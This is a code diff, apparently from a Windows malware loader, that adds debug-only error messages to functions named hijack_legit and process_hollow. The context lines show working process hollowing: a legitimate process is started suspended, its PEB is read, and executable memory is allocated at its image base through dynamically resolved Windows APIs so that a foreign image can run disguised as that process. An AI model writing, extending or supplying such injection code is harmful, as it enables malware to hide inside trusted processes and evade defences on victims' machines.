@@ -62,7 +62,12 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
 	if (!(virtalloc = (VIRTUALALLOCEX)resolve_symbol(&g_fonctions[8])))
                 return (0);
 	if (!(hijackRemote = virtalloc(rpi->hProcess, /*NULL*/rpeb->Reserved3[1], pe->nthdr.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
+	{
+#ifdef CYANNDBG
+		printf("{!} Failed to allocate memory in remote process!\n");
+#endif
                 return (0);
+	}
 	*newbase = (CINT)rpeb->Reserved3[1];
 	if (!(writeprocmem = (WRITEPROCESSMEM)resolve_symbol(&g_fonctions[9])))
                 return (0);
@@ -112,7 +117,12 @@ int     process_hollow(WCHAR *legitproc, t_pe *pe)
 	remotepeb = NULL;
 	pi = NULL;
 	if (!(pi = create_process(legitproc, CREATE_SUSPENDED)))
+	{
+#ifdef CYANNDBG
+		printf("{!} Can't create process!");
+#endif
 		return (0);
+	}
 	if ((remotepeb = get_remote_peb(pi->hProcess)))
 	{
 		if (hijack_legit(pi, remotepeb, pe, &newbase))
@@ -125,7 +135,15 @@ int     process_hollow(WCHAR *legitproc, t_pe *pe)
 				return (1);
 			}
 		}
+#ifdef CYANNDBG
+		else
+			printf("{!} hijack_legit failed!\n");
+#endif
 	}
+#ifdef CYANNDBG
+	else
+		printf("{!} Can't get remote process PEB!\n");
+#endif
 	free(remotepeb);
 	free(pi);
 	return (0);
